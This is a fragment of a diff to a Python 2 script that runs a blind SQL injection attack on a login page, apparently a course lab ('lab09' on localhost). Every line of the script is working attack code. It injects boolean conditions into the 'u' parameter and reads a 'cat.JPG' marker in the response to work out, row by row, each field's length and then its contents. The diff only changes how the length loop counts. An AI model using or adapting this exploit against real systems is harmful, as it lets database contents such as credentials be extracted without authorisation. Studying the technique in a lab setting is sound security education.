@@ -24,14 +24,16 @@ for row in xrange(1,101):
 	for iter in xrange(0,2):
 		field=iterator.next()
 		size = 0;
-		for s in xrange(0,40):
-			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(s) + "--%20"
+		while size<= 100:
+
+			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(size) + "--%20"
 			f = urllib.urlopen(request)
 			response = f.read()
 			if (response.find('cat.JPG')!=-1): 
-				# print "found size : %s" %s
-				size = s
+				# print "found size : %s" %s				
 				break
+			size+=1
+				
 		word=""
 		for pos in xrange(1,size+1):
 
